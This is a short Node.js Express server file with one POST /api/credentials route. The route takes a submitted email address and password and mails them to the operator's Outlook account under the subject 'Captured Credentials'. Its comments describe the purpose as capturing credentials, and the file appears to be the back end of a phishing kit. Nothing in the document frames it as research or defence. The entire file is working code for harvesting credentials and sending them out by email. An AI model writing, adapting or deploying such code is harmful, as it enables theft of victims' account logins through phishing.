require('dotenv').config();  // Load environment variables from .env file

const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");

const app = express();
app.use(bodyParser.json());  // Middleware to parse incoming JSON requests

// POST route to capture email and password
app.post("/api/credentials", async (req, res) => {
    const { email, password } = req.body;  // Destructure the email and password from the request body

    if (!email || !password) {
        return res.status(400).send("Email and password are required.");
    }

    // Set up nodemailer transporter
    const transporter = nodemailer.createTransport({
        service: "hotmail",  // Use Outlook's service (hotmail)
        auth: {
            user: process.env.EMAIL_USER,  // Your Outlook email from the .env file
            pass: process.env.EMAIL_PASS,  // Your app password from the .env file
        },
    });

    // Prepare the email content
    const mailOptions = {
        from: process.env.EMAIL_USER,  // Your email address
        to: process.env.EMAIL_USER,  // Send the captured credentials to your email
        subject: "Captured Credentials",
        text: `Email: ${email}\nPassword: ${password}`,
    };

    try {
        // Send the email
        await transporter.sendMail(mailOptions);
        console.log("Email sent successfully.");
        res.status(200).send("Credentials received and emailed.");
    } catch (error) {
        console.error("Error sending email:", error);
        res.status(500).send("Failed to send email.");
    }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
